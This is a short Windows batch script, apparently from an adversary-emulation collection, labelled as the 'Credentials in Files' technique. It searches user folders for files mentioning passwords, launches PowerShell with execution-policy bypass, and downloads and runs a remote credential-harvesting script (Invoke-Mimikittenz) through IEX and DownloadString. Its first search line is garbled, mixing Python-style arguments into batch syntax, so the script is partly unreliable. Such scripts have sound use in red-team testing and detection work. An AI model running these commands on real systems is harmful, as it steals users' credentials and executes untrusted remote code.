@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Credentials in Files (T1081)
ECHO.
ECHO [+] Search using CMD
ECHO -------------------------------------------------------------------
dir %s /s /b | findstr password % %USERPROFILE%\Documents\, shell=True
ECHO.

ECHO [+] Search using Powershell
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe -ep bypass "findstr /si pass *.doc, *.txt"
cmd.exe /c powershell.exe -ep bypass "ls -R -Path %EXFIL%\*.txt | select-string -Pattern password"
cmd.exe /c powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikittenz.ps1'); $m = Invoke-Mimikittenz; $m
ECHO.
